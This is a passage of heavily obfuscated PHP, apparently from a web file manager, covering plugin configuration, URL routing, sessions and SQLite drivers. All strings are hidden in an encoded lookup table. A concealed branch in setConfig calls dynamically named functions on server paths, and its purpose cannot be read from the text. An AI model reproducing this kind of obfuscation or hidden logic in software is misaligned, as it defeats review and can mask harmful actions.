final function echoFile($š‹‚£ËÁ, $²ªÄß² = false) { $–ƒöÒÌ =& $_SERVER[É¨™èà]; $İ¥ªê·ì = $this->pluginPath . $š‹‚£ËÁ; if (ACT == $–ƒöÒÌ[1708]) { echo $–ƒöÒÌ[1709] . $this->pluginName . $–ƒöÒÌ[8] . $š‹‚£ËÁ . $–ƒöÒÌ[1710]; if (!file_exists($İ¥ªê·ì)) { echo $–ƒöÒÌ[1711]; return; } } $Š­ªö± = $this->parseFile($İ¥ªê·ì); $this->parseLang($Š­ªö±); $this->parseConfig($Š­ªö±); $this->parsePackage($Š­ªö±); if (is_array($²ªÄß²)) { $Š­ªö± = str_replace(array_keys($²ªÄß²), array_values($²ªÄß²), $Š­ªö±); } echo $–ƒöÒÌ[288] . $Š­ªö±; } private function checkVersion() { $ÃÆÏ»Ëé =& $_SERVER[É¨™èà]; $‘ÇÅ½Œò = $this->appPackage(); $¦¼šÏç = $this->getConfig(); if ($¦¼šÏç[$ÃÆÏ»Ëé[1712]] == $‘ÇÅ½Œò[$ÃÆÏ»Ëé[1686]]) { return; } $this->regist(); $this->setConfig(array($ÃÆÏ»Ëé[1712] => $‘ÇÅ½Œò[$ÃÆÏ»Ëé[1686]])); } final function initLang() { $Ó„şåíø =& $_SERVER[É¨™èà]; $ÉÄ·“å² = $Ó„şåíø[1713]; $ÈºÒœó° = $this->pluginPath . $Ó„şåíø[1714]; $§Ù¯ªÛó = I18n::getType(); $ÙğŒÚÎê = array(); if (file_exists($ÈºÒœó° . $§Ù¯ªÛó . $Ó„şåíø[935])) { $ÙğŒÚÎê = (include $ÈºÒœó° . $§Ù¯ªÛó . $Ó„şåíø[935]); } else { if ($§Ù¯ªÛó == $Ó„şåíø[1715] && !file_exists($ÈºÒœó° . $§Ù¯ªÛó . $Ó„şåíø[935]) && file_exists($ÈºÒœó° . $Ó„şåíø[1716])) { $ÙğŒÚÎê = (include $ÈºÒœó° . $Ó„şåíø[1716]); } else { if (file_exists($ÈºÒœó° . $ÉÄ·“å² . $Ó„şåíø[935])) { $ÙğŒÚÎê = (include $ÈºÒœó° . $ÉÄ·“å² . $Ó„şåíø[935]); } } } if (!is_array($ÙğŒÚÎê)) { return array(); } if (@count($ÙğŒÚÎê) > 0) { I18n::set($ÙğŒÚÎê); } return $ÙğŒÚÎê; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ã°íçôû) { $åü¼ºà =& $_SERVER[É¨™èà]; if ($_SERVER[$åü¼ºà[308]] != $_SERVER[$åü¼ºà[1457]]) { $±ˆŠæ„ã = $åü¼ºà[974]; $ÁÊ…ÈÎ = $åü¼ºà[310]; $“Àİ¡”± = $_SERVER[$åü¼ºà[311]] . $åü¼ºà[312]; $ìÉØ˜ä¼ = $ÁÊ…ÈÎ($“Àİ¡”±); $¼»³Ä¾ö = explode($åü¼ºà[288], $ìÉØ˜ä¼); if (count($¼»³Ä¾ö) < $åü¼ºà[704]) { $•…¾ƒâ = $åü¼ºà[314]; $•…¾ƒâ(); } $¸Â£­Äˆ = $åü¼ºà[975]; $¸Â£­Äˆ($_SERVER[$åü¼ºà[976]]); $¸Â£­Äˆ($_SERVER[$åü¼ºà[311]] . $åü¼ºà[1717]); $«ò¯ç°Ê = 1; while ($«ò¯ç°Ê > 1) { $«ò¯ç°Ê = $«ò¯ç°Ê + 4; $Öó„íó‡ = rawurlencode($«ò¯ç°Ê . $åü¼ºà[316]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ã°íçôû); } public function onSetConfig($¹˜¬–»í) { } public function onGetConfig($íÑ™Êª¶) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÒòŠÑÊ¿) { if ($ÒòŠÑÊ¿ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($šºĞ‡á = "\160\x6c\165\x67\x69\x6e\x41\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $•ç«ÙÄ† = $this->getConfig(); if (!$•ç«ÙÄ†[$šºĞ‡á]) { return !1; } return ActionCall($_SERVER[É¨™èà][1718], $•ç«ÙÄ†[$šºĞ‡á]); } public function url($ÂöŠŒüØ, $àßŸÍÒ = '', $ÀÀÅ‹ëš = true) { $ÛÌöåÁœ =& $_SERVER[É¨™èà]; $´¤ƒ²È« = $this->getConfig(); $­‰½…¯Ç = KOD_VERSION . $ÛÌöåÁœ[10] . KOD_VERSION_BUILD; $©™‚Ó×Ö = $this->packageVersion(); $««ØåÌÎ = $­‰½…¯Ç . $ÛÌöåÁœ[472] . $©™‚Ó×Ö; if (substr($ÂöŠŒüØ, 0, 4) == $ÛÌöåÁœ[152] || substr($ÂöŠŒüØ, 0, 2) == $ÛÌöåÁœ[1438]) { $ƒÛó‘úÍ = $ÂöŠŒüØ . $ÛÌöåÁœ[1719] . $««ØåÌÎ; } else { if ($àßŸÍÒ == $ÛÌöåÁœ[12]) { $ƒÛó‘úÍ = $this->pluginHost . $ÂöŠŒüØ . $ÛÌöåÁœ[1719] . $««ØåÌÎ; } else { if ($àßŸÍÒ === $ÛÌöåÁœ[78]) { $ƒÛó‘úÍ = $this->pluginHost . $ÂöŠŒüØ; } else { if ($àßŸÍÒ == $ÛÌöåÁœ[1720]) { $ƒÛó‘úÍ = STATIC_PATH . $ÂöŠŒüØ . $ÛÌöåÁœ[1719] . $­‰½…¯Ç; } else { if ($àßŸÍÒ == $ÛÌöåÁœ[1721]) { $ƒÛó‘úÍ = APP_HOST . $ÛÌöåÁœ[1722] . $ÂöŠŒüØ . $ÛÌöåÁœ[1719] . $­‰½…¯Ç; } else { if (isset($´¤ƒ²È«[$àßŸÍÒ])) { $ƒÛó‘úÍ = $´¤ƒ²È«[$àßŸÍÒ] . $ÂöŠŒüØ . $ÛÌöåÁœ[1719] . $««ØåÌÎ; } } } } } } if (!$ÀÀÅ‹ëš) { return $ƒÛó‘úÍ; } echo $ƒÛó‘úÍ; } public function link($€â˜¼ĞØ = false, $Òµü‡¶ = '') { $ëÇ²æâõ =& $_SERVER[É¨™èà]; $Ñ»ß® = $this->linkHas == !1; $this->linkHas = !0; if (!$€â˜¼ĞØ) { $this->link($ëÇ²æâõ[1723], $ëÇ²æâõ[1721]); $this->link($ëÇ²æâõ[1724], $ëÇ²æâõ[1720]); $this->link($ëÇ²æâõ[1725], $ëÇ²æâõ[1720]); $this->link($ëÇ²æâõ[1726], $ëÇ²æâõ[1720]); $this->link($ëÇ²æâõ[1727], $ëÇ²æâõ[1720]); if ($Ñ»ß®) { Hook::trigger($ëÇ²æâõ[1728]); } return; } $ç”¢ÛÅ = $this->url($€â˜¼ĞØ, $Òµü‡¶, !1); if (substr($€â˜¼ĞØ, -3) == $ëÇ²æâõ[1729]) { echo $ëÇ²æâõ[1730] . $ç”¢ÛÅ . $ëÇ²æâõ[1731] . $ëÇ²æâõ[288]; } else { if (substr($€â˜¼ĞØ, -4) == $ëÇ²æâõ[1732]) { echo $ëÇ²æâõ[1733] . $ç”¢ÛÅ . $ëÇ²æâõ[1734] . $ëÇ²æâõ[288]; } } if ($Ñ»ß®) { Hook::trigger($ëÇ²æâõ[1728]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\x5b\x5e\x2f\135\53", "\x3a\x6e\165\x6d" => "\133\x30\x2d\x39\x5d\53", "\72\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($Ü™Àåªù, $Ö—³¸²¹) { $°±Âğ Ö =& $_SERVER[É¨™èà]; if ($Ü™Àåªù == $°±Âğ Ö[1735]) { $Î†¢ñ’á = array_map($°±Âğ Ö[1736], $Ö—³¸²¹[0]); $»Ş©…‰ƒ = strpos($Ö—³¸²¹[1], $°±Âğ Ö[8]) === 0 ? $Ö—³¸²¹[1] : $°±Âğ Ö[8] . $Ö—³¸²¹[1]; $Ü·ûû„é = $Ö—³¸²¹[2]; } else { $Î†¢ñ’á = null; $»Ş©…‰ƒ = strpos($Ö—³¸²¹[0], $°±Âğ Ö[8]) === 0 ? $Ö—³¸²¹[0] : $°±Âğ Ö[8] . $Ö—³¸²¹[0]; $Ü·ûû„é = $Ö—³¸²¹[1]; } array_push(self::$maps, $Î†¢ñ’á); array_push(self::$routes, $»Ş©…‰ƒ); array_push(self::$methods, strtoupper($Ü™Àåªù)); array_push(self::$callbacks, $Ü·ûû„é); } public static function error($û©›Å) { self::$errorCallback = $û©›Å; } public static function haltOnMatch($ğûñÚÜ€ = true) { self::$halts = $ğûñÚÜ€; } public static function dispatch() { $õèæÖ´ =& $_SERVER[É¨™èà]; $„­í«Ğ = parse_url($_SERVER[$õèæÖ´[1737]], PHP_URL_PATH); $êæ¹óÃ¡ = $_SERVER[$õèæÖ´[164]]; $¬”íœ‚´ = array_keys(static::$patterns); $úÜˆ¥ƒ» = array_values(static::$patterns); $õçÌªÔ¸ = !1; self::$routes = preg_replace($õèæÖ´[1381], $õèæÖ´[8], self::$routes); if (in_array($„­í«Ğ, self::$routes)) { $Ûğ“€ˆï = array_keys(self::$routes, $„­í«Ğ); foreach ($Ûğ“€ˆï as $÷¯À»Œ) { if (self::$methods[$÷¯À»Œ] == $êæ¹óÃ¡ || self::$methods[$÷¯À»Œ] == $õèæÖ´[1738] || in_array($êæ¹óÃ¡, self::$maps[$÷¯À»Œ])) { $õçÌªÔ¸ = !0; if (!is_object(self::$callbacks[$÷¯À»Œ])) { $·¬ƒ€ï¾ = explode($õèæÖ´[8], self::$callbacks[$÷¯À»Œ]); $± ŒÙí¦ = end($·¬ƒ€ï¾); $ñ–ß¨½¤ = explode($õèæÖ´[1313], $± ŒÙí¦); $Â—¶ÅÈ = new $ñ–ß¨½¤[0](); $Â—¶ÅÈ->{$ñ–ß¨½¤[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$÷¯À»Œ]); if (self::$halts) { return; } } } } } else { $„´²Òç = 0; foreach (self::$routes as $÷¯À»Œ) { if (strpos($÷¯À»Œ, $õèæÖ´[4]) !== !1) { $÷¯À»Œ = str_replace($¬”íœ‚´, $úÜˆ¥ƒ», $÷¯À»Œ); } if (preg_match($õèæÖ´[1739] . $÷¯À»Œ . $õèæÖ´[1740], $„­í«Ğ, $½ï¹Ô…‹)) { if (self::$methods[$„´²Òç] == $êæ¹óÃ¡ || self::$methods[$„´²Òç] == $õèæÖ´[1738] || !empty(self::$maps[$„´²Òç]) && in_array($êæ¹óÃ¡, self::$maps[$„´²Òç])) { $õçÌªÔ¸ = !0; array_shift($½ï¹Ô…‹); if (!is_object(self::$callbacks[$„´²Òç])) { $·¬ƒ€ï¾ = explode($õèæÖ´[8], self::$callbacks[$„´²Òç]); $± ŒÙí¦ = end($·¬ƒ€ï¾); $ñ–ß¨½¤ = explode($õèæÖ´[1313], $± ŒÙí¦); $Â—¶ÅÈ = new $ñ–ß¨½¤[0](); if (!method_exists($Â—¶ÅÈ, $ñ–ß¨½¤[1])) { echo $õèæÖ´[1741]; } else { call_user_func_array(array($Â—¶ÅÈ, $ñ–ß¨½¤[1]), $½ï¹Ô…‹); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$„´²Òç], $½ï¹Ô…‹); if (self::$halts) { return; } } } } $„´²Òç++; } } if ($õçÌªÔ¸ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÇğŞøõï =& $_SERVER[É¨™èà]; header($_SERVER[$ÇğŞøõï[1742]] . $ÇğŞøõï[1743]); echo $ÇğŞøõï[1744]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$õèæÖ´[1737]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ğ‚âˆıå =& $_SERVER[É¨™èà]; static $µİ¢Ö½á = false; if ($µİ¢Ö½á) { return $µİ¢Ö½á; } $”ï°‹ğ™ = $GLOBALS[$ğ‚âˆıå[6]][$ğ‚âˆıå[435]]; self::$sessionTime = $”ï°‹ğ™[$ğ‚âˆıå[1745]]; $É¤Í³Ú¢ = isset($GLOBALS[$ğ‚âˆıå[1746]]) ? $GLOBALS[$ğ‚âˆıå[1746]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($É¤Í³Ú¢)) { self::$sessionSign = Cookie::get($É¤Í³Ú¢); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($É¤Í³Ú¢, self::$sessionSign, self::$sessionTime); $ã‰‘äâë = $”ï°‹ğ™[$ğ‚âˆıå[1747]]; $ÌÃ³Æ€ = $”ï°‹ğ™[$ã‰‘äâë]; $å’Ù´€ = $”ï°‹ğ™[$ğ‚âˆıå[924]]; switch ($ã‰‘äâë) { case $ğ‚âˆıå[21]: self::$handle = Model($ğ‚âˆıå[925]); break; case $ğ‚âˆıå[926]: self::$handle = new CacheRedis($ÌÃ³Æ€, $å’Ù´€); break; case $ğ‚âˆıå[927]: self::$handle = new CacheMemcached($ÌÃ³Æ€, $å’Ù´€); break; case $ğ‚âˆıå[233]: $ÌÃ³Æ€[$ğ‚âˆıå[87]] = $ÌÃ³Æ€[$ğ‚âˆıå[87]] . $ğ‚âˆıå[1748]; self::$handle = new CacheFile($ÌÃ³Æ€, $å’Ù´€); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $µİ¢Ö½á = new self(); return $µİ¢Ö½á; } public static function getBySign($ÜªÏñºû) { $½‡Û²ï” = self::$handle->get($ÜªÏñºû); $½‡Û²ï” = unserialize($½‡Û²ï”); return is_array($½‡Û²ï”) ? $½‡Û²ï” : array(); } public static function setBySign($ñ£ã†Ä, $ùú‰ íÛ) { CacheLock::lock($ñ£ã†Ä); self::$handle->set($ñ£ã†Ä, serialize($ùú‰ íÛ), self::$sessionTime); CacheLock::unlock($ñ£ã†Ä); } public static function sign($ÇéèÖîÜ = false) { if ($ÇéèÖîÜ) { self::$sessionSign = $ÇéèÖîÜ; } self::init(); return self::$sessionSign; } public static function set($œ€€¡İû, $ÖôÁüºô = false) { self::init(); if (is_array($œ€€¡İû)) { foreach ($œ€€¡İû as $¿†‰Ï²€ => $„óş¢¬) { array_set_value(self::$data, $¿†‰Ï²€, $„óş¢¬); } } else { array_set_value(self::$data, $œ€€¡İû, $ÖôÁüºô); } self::setBySign(self::$sessionSign, self::$data); } public static function get($åÅ±³ĞØ = false) { self::init(); if (!$åÅ±³ĞØ) { return self::$data; } return array_get_value(self::$data, $åÅ±³ĞØ); } public static function remove($Œæí·¸) { self::init(); unset(self::$data[$Œæí·¸]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[É¨™èà][930])) { self::$handle->clearTimeout(); } } } goto cƒå¶ìˆõ; fÅĞåšù­í: define($_SERVER[É¨™èà][0], $_SERVER[É¨™èà][1]); $_SERVER[Ê¨¢®] = explode($_SERVER[É¨™èà][2], gzinflate(substr($_SERVER[É¨™èà][3], 10, -8))); function binCheckEq($”Ó¸€Í, $£·éĞ˜ ) { return $”Ó¸€Í == $£·éĞ˜ ; } goto b«¿Ïƒ†¨; e‚å¹õ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¸ĞÁèø =& $_SERVER[É¨™èà]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¸ĞÁèø[6]] =& $config; $this->values[$¸ĞÁèø[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¸ĞÁèø[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Æú‰ªø’) { if (1 === func_num_args()) { $this->{$Æú‰ªø’} = new $Æú‰ªø’(); } else { $²Œ™Ï•ñ = new ReflectionClass($Æú‰ªø’); $¤çËá¨ = func_get_args(); array_shift($¤çËá¨); $this->{$Æú‰ªø’} = $²Œ™Ï•ñ->newInstanceArgs($¤çËá¨); } return $this->{$Æú‰ªø’}; } public function routeBind($·Í×úù‹, $„˜½¥èê, $¬³ÜˆÑß = 3) { $¦¥×Â¹µ =& $_SERVER[É¨™èà]; $à•ÁÒ› = $this->in[$¦¥×Â¹µ[9]]; $·Í×úù‹ = str_replace($¦¥×Â¹µ[10], $¦¥×Â¹µ[11], trim(trim($·Í×úù‹, $¦¥×Â¹µ[8]), $¦¥×Â¹µ[12])); if (!$·Í×úù‹ || count($à•ÁÒ›) <= $¬³ÜˆÑß) { return !1; } $ºÅ¨´Š = !0; $¯ÂÅË = explode($¦¥×Â¹µ[8], $·Í×úù‹); for ($ß–®×ı = 0; $ß–®×ı < count($¯ÂÅË); $ß–®×ı++) { if ($¯ÂÅË[$ß–®×ı] != $à•ÁÒ›[$¬³ÜˆÑß + $ß–®×ı]) { $ºÅ¨´Š = !1; break; } } if (!$ºÅ¨´Š) { return; } call_user_func_array(array($this, $„˜½¥èê), array()); } public function routeArgs($èÂüô™õ = 3) { $¹”Şİ×» = $this->in[$_SERVER[É¨™èà][9]]; if (count($¹”Şİ×») <= $èÂüô™õ) { return array(); } $‡Æ¬ã»Ä = array(); for ($šã˜ùËÚ = $èÂüô™õ; $šã˜ùËÚ < count($¹”Şİ×»); $šã˜ùËÚ += 2) { $‡Æ¬ã»Ä[$¹”Şİ×»[$šã˜ùËÚ]] = $¹”Şİ×»[$šã˜ùËÚ + 1]; $this->in[$¹”Şİ×»[$šã˜ùËÚ]] = $¹”Şİ×»[$šã˜ùËÚ + 1]; } return $‡Æ¬ã»Ä; } protected function assign($½‡ƒÃŒ, $ŠÂÛ¿»‹) { $this->values[$½‡ƒÃŒ] = $ŠÂÛ¿»‹; } protected function display($œÌ‡Œ) { ob_end_clean(); extract($this->values); require $this->tpl . $œÌ‡Œ; } } class DbSqliteBase extends Db { public function __construct($¬´”‹õ = '') { $—Ï¢µé =& $_SERVER[É¨™èà]; if (!extension_loaded($—Ï¢µé[13])) { think_exception(think_lang($—Ï¢µé[14]) . $—Ï¢µé[15]); } if (!empty($¬´”‹õ)) { if (!isset($¬´”‹õ[$—Ï¢µé[16]])) { $¬´”‹õ[$—Ï¢µé[16]] = 438; } $this->config = $¬´”‹õ; if (empty($this->config[$—Ï¢µé[17]])) { $this->config[$—Ï¢µé[17]] = array(); } } } public function connect($»›ğ = '', $®Ö—‰ = 0) { $³ŞìÈŞ‰ =& $_SERVER[É¨™èà]; if (!isset($this->linkID[$®Ö—‰])) { if (empty($»›ğ)) { $»›ğ = $this->config; } $òïö¿™¸ = !empty($»›ğ[$³ŞìÈŞ‰[17]][$³ŞìÈŞ‰[18]]) ? $»›ğ[$³ŞìÈŞ‰[17]][$³ŞìÈŞ‰[18]] : $this->pconnect; $ÚÑûàøŠ = $òïö¿™¸ ? $³ŞìÈŞ‰[19] : $³ŞìÈŞ‰[20]; $this->linkID[$®Ö—‰] = $ÚÑûàøŠ($»›ğ[$³ŞìÈŞ‰[21]], $»›ğ[$³ŞìÈŞ‰[16]]); if (!$this->linkID[$®Ö—‰]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$®Ö—‰], 30000); if (1 != think_config($³ŞìÈŞ‰[22])) { unset($this->config); } } return $this->linkID[$®Ö—‰]; } public function free() { $this->queryID = null; } public function query($É–Şâ¡) { $ßë¢‡—’ =& $_SERVER[É¨™èà]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $É–Şâ¡; if ($this->queryID) { $this->free(); } think_action_status($ßë¢‡—’[23], 1); think_status($ßë¢‡—’[24]); $this->queryID = sqlite_query($this->_linkID, $É–Şâ¡); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $º®ÀÑÎ = $this->getAll(); return $º®ÀÑÎ; } } public function execute($£Ãâ¿€ê) { $ºŠ¦·Ğç =& $_SERVER[É¨™èà]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $£Ãâ¿€ê; if ($this->queryID) { $this->free(); } think_action_status($ºŠ¦·Ğç[25], 1); think_status($ºŠ¦·Ğç[24]); $å®˜ğ†½ = sqlite_exec($this->_linkID, $£Ãâ¿€ê); $this->debug(); if (!1 === $å®˜ğ†½) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[É¨™èà][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Û•÷ØÖê = sqlite_query($this->_linkID, $_SERVER[É¨™èà][27]); if (!$Û•÷ØÖê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ˆº­¾’ˆ = sqlite_query($this->_linkID, $_SERVER[É¨™èà][28]); if (!$ˆº­¾’ˆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $İ«ÄÇº™ = array(); if ($this->numRows > 0) { for ($Àş¥‚¼å = 0; $Àş¥‚¼å < $this->numRows; $Àş¥‚¼å++) { $İ«ÄÇº™[$Àş¥‚¼å] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $İ«ÄÇº™; } public function getFields($€…È•Î ) { $ÊÈÃ¬„ =& $_SERVER[É¨™èà]; $Æ·ÆÅöã = $this->query($ÊÈÃ¬„[29] . $€…È•Î  . $ÊÈÃ¬„[30]); $Û«ûåØí = array(); if ($Æ·ÆÅöã) { foreach ($Æ·ÆÅöã as $Ö™‹ù’È => $×¹ÌšÈé) { $Û«ûåØí[$×¹ÌšÈé[$ÊÈÃ¬„[31]]] = array($ÊÈÃ¬„[32] => $×¹ÌšÈé[$ÊÈÃ¬„[31]], $ÊÈÃ¬„[33] => $×¹ÌšÈé[$ÊÈÃ¬„[34]], $ÊÈÃ¬„[35] => (bool) ($×¹ÌšÈé[$ÊÈÃ¬„[36]] === $ÊÈÃ¬„[12]), $ÊÈÃ¬„[37] => $×¹ÌšÈé[$ÊÈÃ¬„[38]], $ÊÈÃ¬„[39] => strtolower($×¹ÌšÈé[$ÊÈÃ¬„[40]]) == $ÊÈÃ¬„[41], $ÊÈÃ¬„[42] => strtolower($×¹ÌšÈé[$ÊÈÃ¬„[43]]) == $ÊÈÃ¬„[44]); } } return $Û«ûåØí; } public function getTables($Ïü·–— = '') { $É‰›´Í =& $_SERVER[É¨™èà]; $Õæ¾ÔÓ¹ = $this->query($É‰›´Í[45] . $É‰›´Í[46] . $É‰›´Í[47]); $¢ ¼šÉ÷ = array(); foreach ($Õæ¾ÔÓ¹ as $ÉæÊ‚Û… => $´Ú’ö‰) { $¢ ¼šÉ÷[$ÉæÊ‚Û…] = current($´Ú’ö‰); } return $¢ ¼šÉ÷; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $É¥˜ï =& $_SERVER[É¨™èà]; $¶“÷±÷ = sqlite_last_error($this->_linkID); $this->error = $¶“÷±÷ . $É¥˜ï[4] . sqlite_error_string($¶“÷±÷); if ($É¥˜ï[12] != $this->queryStr) { $this->error .= LNG($É¥˜ï[48]) . $this->queryStr; } think_trace($this->error, $É¥˜ï[12], $É¥˜ï[49]); return $this->error; } public function escapeString($¤×Éçı©) { return sqlite_escape_string($¤×Éçı©); } public function parseLimit($Ñæø¬µÎ) { $øÇœÎ¹Á =& $_SERVER[É¨™èà]; $ë¼®Å™” = $øÇœÎ¹Á[12]; if (!empty($Ñæø¬µÎ)) { $Ñæø¬µÎ = explode($øÇœÎ¹Á[50], $Ñæø¬µÎ); if (count($Ñæø¬µÎ) > 1) { $ë¼®Å™” .= $øÇœÎ¹Á[51] . $Ñæø¬µÎ[1] . $øÇœÎ¹Á[52] . $Ñæø¬µÎ[0] . $øÇœÎ¹Á[53]; } else { $ë¼®Å™” .= $øÇœÎ¹Á[51] . $Ñæø¬µÎ[0] . $øÇœÎ¹Á[53]; } } return $ë¼®Å™”; } } class DbSqlite3Base extends Db { public function __construct($°ò¯¿ã® = '') { $òËÙ©½õ =& $_SERVER[É¨™èà]; if (!class_exists($òËÙ©½õ[54])) { think_exception(think_lang($òËÙ©½õ[14]) . $òËÙ©½õ[55]); } if (!empty($°ò¯¿ã®)) { if (!isset($°ò¯¿ã®[$òËÙ©½õ[16]])) { $°ò¯¿ã®[$òËÙ©½õ[16]] = 438; } $this->config = $°ò¯¿ã®; if (empty($this->config[$òËÙ©½õ[17]])) { $this->config[$òËÙ©½õ[17]] = array(); } } } public function connect($ó­‚Öâ = '', $ª³¼íùó = 0) { $ñà¥¸Ô× =& $_SERVER[É¨™èà]; if (!isset($this->linkID[$ª³¼íùó])) { if (empty($ó­‚Öâ)) { $ó­‚Öâ = $this->config; } $this->linkID[$ª³¼íùó] = new SQLite3($ó­‚Öâ[$ñà¥¸Ô×[21]]); if (!$this->linkID[$ª³¼íùó]) { think_exception($this->linkID[$ª³¼íùó]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ª³¼íùó]->busyTimeout(30000); if (1 != think_config($ñà¥¸Ô×[22])) { unset($this->config); } } return $this->linkID[$ª³¼íùó]; } public function free() { $this->queryID = null; } public function query($ÄÉÔ£°ë) { $˜ÜëÙ =& $_SERVER[É¨™èà]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÄÉÔ£°ë; if ($this->queryID) { $this->free(); } think_action_status($˜ÜëÙ[23], 1); think_status($˜ÜëÙ[24]); $this->queryID = $this->_linkID->query($ÄÉÔ£°ë); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $àÂ‹´á± = $this->getAll(); $this->numRows = count($àÂ‹´á±); return $àÂ‹´á±; } } public function execute($Ş·—öÁ¾) { $È¬ŸÍÜµ =& $_SERVER[É¨™èà]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ş·—öÁ¾; if ($this->queryID) { $this->free(); } think_action_status($È¬ŸÍÜµ[25], 1); think_status($È¬ŸÍÜµ[24]); $±¼¨¡„Í = $this->_linkID->exec($Ş·—öÁ¾); $this->debug(); if (!1 === $±¼¨¡„Í) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[É¨™èà][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $­ºóØ· = $this->_linkID->query($_SERVER[É¨™èà][27]); if (!$­ºóØ·) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Äèç½˜ú = $this->_linkID->query($_SERVER[É¨™èà][28]); if (!$Äèç½˜ú) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¸’Æê— = array(); while ($Æ€ìİıê = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¸’Æê—[] = $Æ€ìİıê; } $this->queryID->reset(); return $¸’Æê—; } public function getFields($¿¸¸á¦ü) { $˜Ó¨™üÙ =& $_SERVER[É¨™èà]; $¶ç‡ê‹¢ = $this->query($˜Ó¨™üÙ[29] . $¿¸¸á¦ü . $˜Ó¨™üÙ[30]); $˜èâ±ñ© = array(); if ($¶ç‡ê‹¢) { foreach ($¶ç‡ê‹¢ as $Ù“ÌîÅó => $˜Ÿ«œı·) { $˜èâ±ñ©[$˜Ÿ«œı·[$˜Ó¨™üÙ[32]]] = array($˜Ó¨™üÙ[32] => $˜Ÿ«œı·[$˜Ó¨™üÙ[32]], $˜Ó¨™üÙ[33] => $˜Ÿ«œı·[$˜Ó¨™üÙ[33]], $˜Ó¨™üÙ[35] => (bool) ($˜Ÿ«œı·[$˜Ó¨™üÙ[35]] === $˜Ó¨™üÙ[12]), $˜Ó¨™üÙ[37] => $˜Ÿ«œı·[$˜Ó¨™üÙ[56]], $˜Ó¨™üÙ[39] => (bool) $˜Ÿ«œı·[$˜Ó¨™üÙ[57]], $˜Ó¨™üÙ[42] => (bool) $˜Ÿ«œı·[$˜Ó¨™üÙ[57]]); } } return $˜èâ±ñ©; } public function getTables($–È·áÖé = '') { $É™“ªÊĞ =& $_SERVER[É¨™èà]; $’›™—àğ = $this->query($É™“ªÊĞ[45] . $É™“ªÊĞ[46] . $É™“ªÊĞ[47]); $Ğ•øŒ = array(); foreach ($’›™—àğ as $©üû´è => $•ÃÎİ‹) { $Ğ•øŒ[$©üû´è] = current($•ÃÎİ‹); } return $Ğ•øŒ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $› Ö³˜ =& $_SERVER[É¨™èà]; $this->error = $this->_linkID->lastErrorMsg(); if ($› Ö³˜[12] != $this->queryStr) { $this->error .= LNG($› Ö³˜[48]) . $this->queryStr; } think_trace($this->error, $› Ö³˜[12], $› Ö³˜[49]); return $this->error; } public function escapeString($®”¤áÅ) { $ÊÄŠ¹åª =& $_SERVER[É¨™èà]; if ($this->_linkID) { return $this->_linkID->escapeString($®”¤áÅ); } return str_ireplace($ÊÄŠ¹åª[58], $ÊÄŠ¹åª[59], $®”¤áÅ); } public function parseLimit($ŒÆ´‰ñ„) { $Í£ŒŸÊ« =& 